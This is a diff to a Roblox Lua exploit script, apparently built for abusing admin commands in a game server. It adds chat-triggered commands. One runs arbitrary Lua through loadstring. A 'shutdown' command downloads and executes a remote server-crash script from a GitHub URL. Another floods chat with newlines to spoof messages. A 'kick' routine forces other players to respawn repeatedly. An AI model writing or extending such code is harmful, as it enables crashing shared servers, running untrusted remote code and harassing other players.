@@ -46,7 +46,7 @@ local function antipunishh()
 local gameFlr = workspace.Terrain._Game
 local adminFlr = gameFlr.Admin
 local padAbuse = true
-local perm = true
+local perm = false
 local loopres = true
 local lc = {}
 
@@ -588,14 +588,31 @@ end)
 cons[#cons + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if string.sub(msg, 0, 3 + #prefix) == prefix.."lua" then
 		local code = string.sub(msg, 5 + #prefix)
+        if debounce1 then return end
+		getgenv().debounce1 = true
+        task.delay(1.5, function()
+            getgenv().debounce1 = false
+        end)
         loadstring(code)()
 	elseif string.sub(msg, 0, 8 + #prefix) == prefix.."shutdown" then
 		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
 		if debounce1 then return end
 		getgenv().debounce1 = true
-            task.delay(1.5, function()
-                getgenv().debounce1 = false
-            end)
+        task.delay(1.5, function()
+            getgenv().debounce1 = false
+        end)
+    elseif string.sub(msg, 0,2) == "m/" then
+        local msg = string.sub(msg, 3)
+        if debounce1 then return end
+		getgenv().debounce1 = true
+        task.delay(1.5, function()
+            getgenv().debounce1 = false
+        end)
+        chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n "..plr.Name..": "..msg)
+        chatt("fogend .")
+        wait(3)
+        chatt("reset all")
+        chatt("fix")
 	elseif string.sub(msg, 0, 4 + #prefix) == prefix.."kick" then
 		if debounce1 then return end
             getgenv().debounce1 = true
@@ -603,6 +620,10 @@ cons[#cons + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 getgenv().debounce1 = false
             end)
 		GetPlayer2(string.sub(msg, 6 + #prefix))
+        if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
+            chatt("respawn me")
+            wait(.67)
+        end
 		spammer = true
         plringame = true
 		chatt("respawn "..target)
